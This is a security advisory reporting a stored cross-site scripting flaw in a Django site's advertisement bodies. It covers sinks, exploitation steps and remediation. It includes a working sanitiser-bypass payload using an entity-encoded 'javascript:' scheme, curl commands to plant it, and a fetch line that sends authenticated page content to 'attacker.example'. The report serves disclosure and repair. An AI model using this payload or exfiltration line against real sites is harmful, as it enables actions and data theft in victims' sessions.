# Description

**CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') (Stored)**

Advertisement bodies are stored as raw markdown in `Advertisement.body` and pre-rendered into `Advertisement.body_html`, which is then emitted unescaped in three templates.

- **Storage / render step:** `Advertisement/models.py:164-170` (`_render_body_html`) calls `Forum.Utils.markdown_utils.render_markdown`, and `Advertisement/models.py:172-175` (`save()`) writes the result to `body_html` (`models.py:60`). The ad is therefore stored as HTML produced by the Forum's regex-based sanitiser.
- **Unescaped sinks:**
  - `Advertisement/templates/advertisement/includes/ad_banner.html:62` - `{{ ad.body_html|safe }}` (site-wide: included by `shared/templates/base/base.html:59`, so it appears on every page extending the base template, e.g. `/`, `/shop/`, `/forum/`, `/account/login/`. The `Advertisement.context_processors.ads` processor injects **all** `active` ads regardless of `placement_zone`.)
  - `Advertisement/templates/advertisement/detail.html:46` - `{{ ad.body_html|safe }}` (owner-only: other users get `302` → `/account/login/` or `404`)
  - `Advertisement/templates/advertisement/admin_pending.html:54` - `{{ ad.body_html|safe }}` (staff review page `/advertisement/admin/pending/`, which renders the payload while the ad is still pending, before any approval)
- **Weak sanitiser:** `Forum/Utils/markdown_utils.py` `sanitize_url()` (lines 204-219) only rejects `javascript:` etc. by a literal, case-insensitive prefix match on the raw attribute string. It does not decode HTML character references. `sanitize_attributes()` (line 195) passes `href` values through it. Python-Markdown leaves character references such as `&#x09;` in link targets intact, and browsers decode them before URL parsing (tab and newline inside a scheme are stripped), so `jav&#x09;ascript:` survives as a working `javascript:` URL.

Because the ad body of an active ad is rendered on every page using the base template, a single active ad executes script in the browser of every visitor who clicks the injected link. Staff are exposed even earlier: the pending-review page renders the payload before the ad is approved.

The `sanitize_url` bypass was confirmed against the live app (`POST /advertisement/create/`, then the stored `body_html` on the owner's detail page) with the payload below:

```
input : [Special offer](jav&#x09;ascript:alert(document.domain))
output: <p><a href="jav&#x09;ascript:alert(document.domain)" rel="nofollow noopener">Special offer</a></p>
```

The plain `javascript:` form is correctly neutralised (`href="#"`), and raw `<script>` and `<img onerror>` are stripped, so the entity-encoded scheme is the working bypass.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Log in as a regular advertiser account and open the ad creation form (`GET /advertisement/create/`). | Authenticated session; `create_advertisement` (`Advertisement/views.py:148`) is reachable. |
| 2 | Submit `POST /advertisement/create/` with `title=Special Offer`, `target_url=https://example.com`, a valid `placement_zone` (e.g. `homepage_banner`), and `body` set to the bypass payload from the PoC section. | The view stores the raw markdown with `status=PENDING` (`views.py:206-216`). `save()` runs `render_markdown` and stores the sanitised output in `body_html`, which still contains the `jav&#x09;ascript:` href. |
| 3 | Wait for a staff member to review the ad on `/advertisement/admin/pending/` and approve it (`POST /advertisement/admin/approve/<id>/`, `approve_ad`, `views.py:471`). Then pay for the campaign on `/advertisement/<id>/activate/` (account password + bank PIN + card, `activate_ad`, `views.py:498`). | The payload already renders unescaped for the reviewing staff member while the ad is pending. Approval only sets `status=approved`; the ad is served in the site-wide banner only once activation sets `status=active` (`views.py:600`, `Advertisement.get_all_active()`). |
| 4 | Visit any page extending the base template (homepage, shop, forum, login page...). A visitor clicks the "Special offer" link in the ad body. (The ad detail page is owner-only and is not a victim-facing sink.) | The anchor href is `jav&#x09;ascript:...`; the browser decodes it to `javascript:alert(document.domain)` and executes the script in the origin of the site. |
| 5 | Confirm execution: the `alert` shows `localhost` (or the deployed host). | Script runs in the victim's authenticated context; it can issue same-origin requests as the victim (e.g. `fetch('/account/...', {credentials: 'include'})`). |

Note: the session cookie is `HttpOnly` by Django default (no `SESSION_COOKIE_HTTPONLY` override in the settings), so `document.cookie` does not expose it. The impact is therefore performing authenticated same-origin actions as the victim, not direct session-cookie theft.

# PoC

Ad body (markdown, max 2000 characters):

```
[Special offer - click here](jav&#x09;ascript:alert(document.domain))
```

Reproduction with curl (the advertiser session cookie is in `advertiser.cookies`):

```bash
CSRF=$(curl -s -b advertiser.cookies http://localhost:8000/advertisement/create/ \
  | grep -oE 'csrfmiddlewaretoken" value="[^"]+' | head -1 | cut -d'"' -f3)

curl -s -b advertiser.cookies -X POST http://localhost:8000/advertisement/create/ \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode 'title=Special Offer' \
  --data-urlencode 'body=[Special offer - click here](jav&#x09;ascript:alert(document.domain))' \
  --data-urlencode 'target_url=https://example.com' \
  --data-urlencode 'placement_zone=homepage_banner' \
  -H "Referer: http://localhost:8000/advertisement/create/"

# Immediately (status still pending), confirm the stored HTML contains the bypass href on the owner-only detail page
# (the POST answers 302 Found -> /advertisement/<id>/):
curl -s -b advertiser.cookies http://localhost:8000/advertisement/<id>/ | grep -o 'href="jav&#x09;ascript[^"]*"'

# Once the ad is active, the same href is served to every visitor (no cookie needed):
curl -s http://localhost:8000/ | grep -o 'href="jav&#x09;ascript[^"]*"'
```

Expected rendered markup in the ad slot (`ad_banner.html:62`):

```html
<div class="ad-body" ...><p><a href="jav&#x09;ascript:alert(document.domain)" rel="nofollow noopener">Special offer - click here</a></p></div>
```

A victim who clicks the link triggers the `alert`. An attacker can replace `alert(document.domain)` with a same-origin request, for example `fetch('/account/', {credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://attacker.example/?d='+encodeURIComponent(t)))`, to exfiltrate authenticated page content.

**Browser-side validation (local environment):**

![Browser-side validation on the advertisement detail page](stored_xss.png)

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Script runs in the origin of every visitor who clicks the ad (including staff on `admin_pending.html`). It can read authenticated page content and exfiltrate it via same-origin requests. The session cookie itself is HttpOnly. |
| Integrity | Script runs as the victim and can submit forms or call APIs on their behalf (transfers, profile changes, purchases), subject to CSRF tokens being readable from the same origin. |
| Availability | Persistent payload in the database: it renders for every visitor until the ad is removed or edited. Can also be used to deface the homepage and shop sidebar. |

Overall severity: **High** - stored script execution on every page using the base template, with a persistent payload. Exploitation requires a victim click (UI:R), and site-wide serving requires staff approval plus a paid activation, which lowers the likelihood (staff reviewers are reachable without approval); the blast radius (site-wide, including staff) keeps it at High. Consistent with the dev catalog CVSS 3.1 estimate of 8.3 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N).

# Remediation

1. **Replace the regex-based HTML sanitiser** — update `Forum/Utils/markdown_utils.py` to use a maintained, parser-based HTML sanitisation library such as `nh3.clean()`, with explicit allow-lists of permitted HTML tags, attributes and URL schemes.
2. **Restrict Markdown rendering** — use a dedicated Markdown configuration for advertisement bodies, disabling raw HTML and unnecessary extensions, including `attr_list` where it is not required.
3. **Enforce safe HTML rendering** — review the use of `|safe` in advertisement templates. Only render HTML that has passed the approved sanitisation process. If rich-text rendering is not required, remove `|safe` and rely on Django's default HTML escaping.
4. **Re-sanitise existing advertisement content** — regenerate stored `Advertisement.body_html` values using the updated sanitisation policy to ensure that previously stored content complies with the new security requirements.
5. **Implement a restrictive Content-Security-Policy (CSP)** — restrict script execution to authorised resources and avoid `unsafe-inline`. Ensure that the policy is preserved by the reverse proxy. CSP must remain a defence-in-depth measure rather than a replacement for HTML sanitisation.
6. **Add regression tests** — extend `Advertisement/tests.py` and the shared Markdown sanitisation tests to verify that unsafe content is neutralised, legitimate formatting is preserved and all advertisement rendering contexts comply with the sanitisation policy.

# Author
WOCSA
